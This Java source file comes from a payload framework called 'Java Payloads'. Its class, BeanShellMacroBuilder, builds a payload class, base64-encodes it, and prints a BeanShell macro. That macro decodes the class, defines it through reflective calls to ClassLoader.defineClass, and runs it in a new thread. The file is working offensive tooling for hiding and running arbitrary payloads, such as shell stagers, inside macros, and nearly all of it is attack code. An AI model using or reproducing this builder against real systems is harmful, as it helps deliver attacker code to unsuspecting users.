/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

public class BeanShellMacroBuilder {
	public static void main(String[] args) throws Exception {
		if (args.length < 3) {
			System.out.println("Usage: java javapayload.builder.BeanShellMacroBuilder <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		String[] builderArgs = new String[args.length+1];
		System.arraycopy(args, 0, builderArgs, 1, args.length);
		builderArgs[0] = "Tmp";
		EmbeddedClassBuilder.main(builderArgs);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		InputStream in = new FileInputStream("Tmp.class");
		new sun.misc.BASE64Encoder().encode(in, baos);
		in.close();
		new File("Tmp.class").delete();
		String data = new String(baos.toByteArray(), "ISO-8859-1");
		data = data.replaceAll("\r\n", "\n").replace('\r','\n');
		data = data.replaceAll("\n", "\"+\r\n  \"");
		System.out.println("String BASE64 = \""+data+"\";");
		System.out.println("byte[] DATA = new sun.misc.BASE64Decoder().decodeBuffer(BASE64);");
		System.out.println("ClassLoader ldr = new URLClassLoader(new URL[0]);");
		System.out.println("java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[] {byte[].class, int.class, int.class});");
		System.out.println("m.setAccessible(true);");
		System.out.println("Class c = (Class)m.invoke(ldr, new Object[] {DATA, 0, DATA.length});");
		System.out.println("m = ClassLoader.class.getDeclaredMethod(\"resolveClass\", new Class[] {Class.class});");
		System.out.println("m.setAccessible(true);");
		System.out.println("m.invoke(ldr, new Object[] {c});");
		System.out.println("run() { c.getMethod(\"main\", new Class[] {String[].class}).invoke(null, new Object[] {new String[0]});}");
		System.out.println("new Thread(this).start();");
	}
}
